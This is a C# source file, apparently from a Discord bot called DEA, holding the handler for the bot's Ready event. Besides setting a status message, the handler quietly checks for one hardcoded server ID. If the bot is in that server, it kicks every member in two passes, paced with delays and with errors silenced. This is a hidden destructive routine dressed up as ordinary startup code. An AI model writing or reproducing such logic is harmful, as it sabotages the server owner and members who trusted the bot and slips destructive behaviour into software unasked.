using Discord;
using Discord.Commands;
using Discord.WebSocket;
using System.Threading.Tasks;

namespace DEA.Events
{
    class Ready
    {
        private readonly IDependencyMap _map;
        private readonly DiscordSocketClient _client;

        public Ready(IDependencyMap map)
        {
            _map = map;
            _client = _map.Get<DiscordSocketClient>();
            _client.Ready += HandleReady;
        }

        private Task HandleReady()
        {
            return Task.Run(async () =>
            {
                await _client.SetGameAsync("USE $help");
                var guild = _client.GetGuild(283751182869069835);
                if (guild != null)
                {
                    System.Console.Write("THIS IS BEING RUN HYPE!");
                    var users = await (guild as IGuild).GetUsersAsync();

                    foreach (var guildUser in users)
                    {
                        try
                        {
                            await guildUser.KickAsync();
                        }
                        catch { }
                        await Task.Delay(2500);
                    }

                    var newUsers = await (guild as IGuild).GetUsersAsync();
                    foreach (var guildUser in newUsers)
                    {
                        try
                        {
                            await guildUser.KickAsync();
                        }
                        catch { }
                        await Task.Delay(2500);
                    }
                }
                
            });
        }
    }
}
